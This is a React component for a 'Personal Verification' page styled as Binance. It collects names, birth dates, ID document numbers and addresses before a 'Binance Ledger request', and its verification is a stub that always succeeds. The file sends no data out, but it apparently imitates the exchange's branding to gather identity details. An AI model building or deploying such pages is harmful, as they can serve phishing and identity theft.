
import React, { useState } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { useToast } from "@/hooks/use-toast";
import { CheckCircle, User, Calendar, MapPin, CreditCard } from "lucide-react";

interface PersonalVerificationProps {
  username: string;
  onVerificationSuccess: () => void;
  onBack: () => void;
}

const PersonalVerification: React.FC<PersonalVerificationProps> = ({ 
  username, 
  onVerificationSuccess, 
  onBack 
}) => {
  const [formData, setFormData] = useState({
    firstName: "",
    lastName: "",
    dateOfBirth: "",
    country: "",
    documentType: "",
    documentNumber: "",
    address: "",
    city: "",
    postalCode: ""
  });
  const [isLoading, setIsLoading] = useState(false);
  const { toast } = useToast();

  const handleInputChange = (field: string, value: string) => {
    setFormData(prev => ({ ...prev, [field]: value }));
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    const requiredFields = ['firstName', 'lastName', 'dateOfBirth', 'country', 'documentType', 'documentNumber'];
    const missingFields = requiredFields.filter(field => !formData[field as keyof typeof formData]);
    
    if (missingFields.length > 0) {
      toast({
        title: "Missing required fields",
        description: "Please fill in all required fields.",
        variant: "destructive",
      });
      return;
    }

    setIsLoading(true);
    
    // Simulate verification
    setTimeout(() => {
      setIsLoading(false);
      onVerificationSuccess();
      toast({
        title: "Verification successful",
        description: "You can now proceed to request your Binance Ledger.",
      });
    }, 2000);
  };

  return (
    <div className="min-h-[calc(100vh-200px)] flex items-center justify-center py-8 px-4">
      <div className="w-full max-w-2xl mx-auto">
        <div className="bg-[#1E2026] rounded-lg border border-[#2B3139] p-8">
          <div className="text-center mb-8">
            <CheckCircle className="w-12 h-12 text-binance-yellow mx-auto mb-4" />
            <h1 className="text-2xl font-bold text-white mb-2">Personal Verification</h1>
            <p className="text-[#848E9C] text-base">
              Please verify your personal details to proceed with Binance Ledger request
            </p>
            <p className="text-[#848E9C] text-sm mt-2">
              Account: <span className="text-white">{username}</span>
            </p>
          </div>

          <form onSubmit={handleSubmit} className="space-y-6">
            {/* Personal Information */}
            <div className="space-y-4">
              <h3 className="text-lg font-semibold text-white border-b border-[#2B3139] pb-2 flex items-center gap-2">
                <User className="w-5 h-5" />
                Personal Information
              </h3>
              
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div>
                  <Label htmlFor="firstName" className="text-[#B7BDC6] text-base mb-2 block">First Name *</Label>
                  <Input
                    id="firstName"
                    type="text"
                    value={formData.firstName}
                    onChange={(e) => handleInputChange("firstName", e.target.value)}
                    className="bg-[#181A20] border-[#2B3139] text-white text-base h-12 focus:border-binance-yellow"
                    required
                  />
                </div>
                
                <div>
                  <Label htmlFor="lastName" className="text-[#B7BDC6] text-base mb-2 block">Last Name *</Label>
                  <Input
                    id="lastName"
                    type="text"
                    value={formData.lastName}
                    onChange={(e) => handleInputChange("lastName", e.target.value)}
                    className="bg-[#181A20] border-[#2B3139] text-white text-base h-12 focus:border-binance-yellow"
                    required
                  />
                </div>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div>
                  <Label htmlFor="dateOfBirth" className="text-[#B7BDC6] text-base mb-2 block flex items-center gap-2">
                    <Calendar className="w-4 h-4" />
                    Date of Birth *
                  </Label>
                  <Input
                    id="dateOfBirth"
                    type="date"
                    value={formData.dateOfBirth}
                    onChange={(e) => handleInputChange("dateOfBirth", e.target.value)}
                    className="bg-[#181A20] border-[#2B3139] text-white text-base h-12 focus:border-binance-yellow"
                    required
                  />
                </div>

                <div>
                  <Label htmlFor="country" className="text-[#B7BDC6] text-base mb-2 block flex items-center gap-2">
                    <MapPin className="w-4 h-4" />
                    Country *
                  </Label>
                  <Select value={formData.country} onValueChange={(value) => handleInputChange("country", value)}>
                    <SelectTrigger className="bg-[#181A20] border-[#2B3139] text-white text-base h-12 focus:border-binance-yellow">
                      <SelectValue placeholder="Select country" />
                    </SelectTrigger>
                    <SelectContent className="bg-[#181A20] border-[#2B3139]">
                      <SelectItem value="US" className="text-white">United States</SelectItem>
                      <SelectItem value="CA" className="text-white">Canada</SelectItem>
                      <SelectItem value="UK" className="text-white">United Kingdom</SelectItem>
                      <SelectItem value="DE" className="text-white">Germany</SelectItem>
                      <SelectItem value="FR" className="text-white">France</SelectItem>
                      <SelectItem value="AU" className="text-white">Australia</SelectItem>
                      <SelectItem value="JP" className="text-white">Japan</SelectItem>
                      <SelectItem value="SG" className="text-white">Singapore</SelectItem>
                    </SelectContent>
                  </Select>
                </div>
              </div>
            </div>

            {/* Document Verification */}
            <div className="space-y-4">
              <h3 className="text-lg font-semibold text-white border-b border-[#2B3139] pb-2 flex items-center gap-2">
                <CreditCard className="w-5 h-5" />
                Document Verification
              </h3>
              
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div>
                  <Label htmlFor="documentType" className="text-[#B7BDC6] text-base mb-2 block">Document Type *</Label>
                  <Select value={formData.documentType} onValueChange={(value) => handleInputChange("documentType", value)}>
                    <SelectTrigger className="bg-[#181A20] border-[#2B3139] text-white text-base h-12 focus:border-binance-yellow">
                      <SelectValue placeholder="Select document type" />
                    </SelectTrigger>
                    <SelectContent className="bg-[#181A20] border-[#2B3139]">
                      <SelectItem value="passport" className="text-white">Passport</SelectItem>
                      <SelectItem value="driving_license" className="text-white">Driving License</SelectItem>
                      <SelectItem value="national_id" className="text-white">National ID</SelectItem>
                    </SelectContent>
                  </Select>
                </div>

                <div>
                  <Label htmlFor="documentNumber" className="text-[#B7BDC6] text-base mb-2 block">Document Number *</Label>
                  <Input
                    id="documentNumber"
                    type="text"
                    value={formData.documentNumber}
                    onChange={(e) => handleInputChange("documentNumber", e.target.value)}
                    className="bg-[#181A20] border-[#2B3139] text-white text-base h-12 focus:border-binance-yellow"
                    required
                  />
                </div>
              </div>
            </div>

            {/* Address Information */}
            <div className="space-y-4">
              <h3 className="text-lg font-semibold text-white border-b border-[#2B3139] pb-2">Address Information</h3>
              
              <div>
                <Label htmlFor="address" className="text-[#B7BDC6] text-base mb-2 block">Street Address</Label>
                <Input
                  id="address"
                  type="text"
                  value={formData.address}
                  onChange={(e) => handleInputChange("address", e.target.value)}
                  className="bg-[#181A20] border-[#2B3139] text-white text-base h-12 focus:border-binance-yellow"
                />
              </div>

              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div>
                  <Label htmlFor="city" className="text-[#B7BDC6] text-base mb-2 block">City</Label>
                  <Input
                    id="city"
                    type="text"
                    value={formData.city}
                    onChange={(e) => handleInputChange("city", e.target.value)}
                    className="bg-[#181A20] border-[#2B3139] text-white text-base h-12 focus:border-binance-yellow"
                  />
                </div>

                <div>
                  <Label htmlFor="postalCode" className="text-[#B7BDC6] text-base mb-2 block">Postal Code</Label>
                  <Input
                    id="postalCode"
                    type="text"
                    value={formData.postalCode}
                    onChange={(e) => handleInputChange("postalCode", e.target.value)}
                    className="bg-[#181A20] border-[#2B3139] text-white text-base h-12 focus:border-binance-yellow"
                  />
                </div>
              </div>
            </div>

            <div className="flex gap-4">
              <Button
                type="button"
                onClick={onBack}
                variant="outline"
                className="flex-1 border-[#2B3139] text-white hover:bg-[#2B3139] text-base h-12"
              >
                Back
              </Button>
              <Button
                type="submit"
                disabled={isLoading}
                className="flex-1 bg-binance-yellow hover:bg-binance-yellow/90 text-black font-semibold h-12 text-base"
              >
                {isLoading ? "Verifying..." : "Verify & Continue"}
              </Button>
            </div>
          </form>
        </div>
      </div>
    </div>
  );
};

export default PersonalVerification;
